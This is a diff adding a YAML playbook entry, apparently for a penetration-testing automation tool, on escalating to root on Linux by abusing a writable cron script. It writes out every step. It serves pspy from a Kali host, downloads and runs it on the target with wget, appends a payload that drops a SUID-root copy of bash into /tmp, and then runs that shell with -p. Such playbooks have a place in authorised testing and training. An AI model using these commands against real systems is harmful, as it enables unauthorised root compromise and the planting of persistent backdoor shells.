@@ -1,0 +1,54 @@
+chain_id: cron_writable
+title: "Linux privesc — cron writable script abuse"
+severity: CRITICAL
+tags: [linux, privesc, cron, pspy, suid]
+
+trigger:
+  any_of:
+    - { kind: "cron-job" }
+    - { kind: "cron-writable" }
+    - { banner_pattern: "(?i)pspy.*CMD.*root" }
+
+description: |
+  pspy detected one or more commands running as root. If the executed
+  script is writable by the current user (or one of its groups), append a
+  payload that drops a SUID-root bash, wait for the next cron tick, and
+  use that bash to escalate. The first thing to check after firing this
+  chain is `ls -la <script>` — if it's not writable, the chain doesn't
+  apply.
+
+steps:
+  - id: 1
+    title: "Verify writability of the script invoked by cron"
+    command: ls -la /ruta/script.sh
+    notes: |
+      Look for the world/group-write bit: `-rwxrwxrwx` or `-rwxrwxr-x` with
+      your group. If only root can write, this chain doesn't apply — pivot
+      to PATH hijacking (chain path_hijacking) or sudo abuse.
+
+  - id: 2
+    title: "Confirm the cron interval with pspy (serve from Kali)"
+    command: python3 -m http.server 8000
+
+  - id: 3
+    title: "Download and run pspy on the target"
+    command: |
+      cd /tmp
+      wget http://10.0.2.15:8000/pspy64
+      chmod +x pspy64
+      ./pspy64
+
+  - id: 4
+    title: "Inject a payload into the writable script"
+    command: echo 'cp /bin/bash /tmp/rb && chmod 4755 /tmp/rb' >> /ruta/script.sh
+
+  - id: 5
+    title: "Wait for the next cron tick and use the SUID bash"
+    command: |
+      /tmp/rb -p
+      id
+    notes: |
+      Should respond with `uid=0(root)`.
+
+references:
+  - https://github.com/DominicBreuker/pspy
